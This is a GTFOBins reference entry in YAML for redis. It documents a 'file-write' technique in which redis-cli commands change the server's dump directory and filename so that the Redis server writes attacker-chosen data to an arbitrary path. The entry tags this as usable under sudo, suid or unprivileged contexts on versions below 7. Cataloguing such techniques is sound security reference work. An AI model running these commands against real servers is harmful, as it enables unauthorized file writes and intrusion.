<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/redis -->
---
functions:
  file-write:
  - binary: false
    code: |-
      redis-cli -h 127.0.0.1
      config set dir /path/to/output-dir/
      config set dbfilename output-file
      set x "DATA"
      save
    comment: |-
      Write files on the server running Redis at the specified location. Written data will appear amongst the database dump.

      Keep in mind that it's actually the server to perform the file write.
    contexts:
      sudo:
      suid:
      unprivileged:
    version: |-
      < 7
...
